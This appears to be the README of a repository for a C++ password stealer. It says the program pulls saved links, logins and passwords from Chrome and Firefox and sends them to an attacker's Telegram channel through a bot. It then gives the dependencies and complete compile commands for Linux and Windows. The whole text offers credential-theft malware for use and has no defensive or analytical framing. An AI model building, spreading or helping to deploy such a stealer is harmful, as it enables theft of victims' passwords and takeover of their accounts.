# stealer

Software is being developed yet!

Password stealer for Google Chrome and Mozilla Firefox written in C++.
It sends stolen links, logins and passwords to Telegram channel with bot you set. 

For compiling you have to install TgBot-cpp library and all dependencies.

You can compile it for Linux using commands below:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp sender.cpp linux/tools.cpp sqlite3.o -lTgBot -lssl -lcrypto -ldl -lpthread -lstdc++fs -std=c++11
```
  
And for Windows you have to execute following commands using MinGW:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp sender.cpp windows/tools.cpp sqlite3.o -lstdc++fs -lcrypt32
```
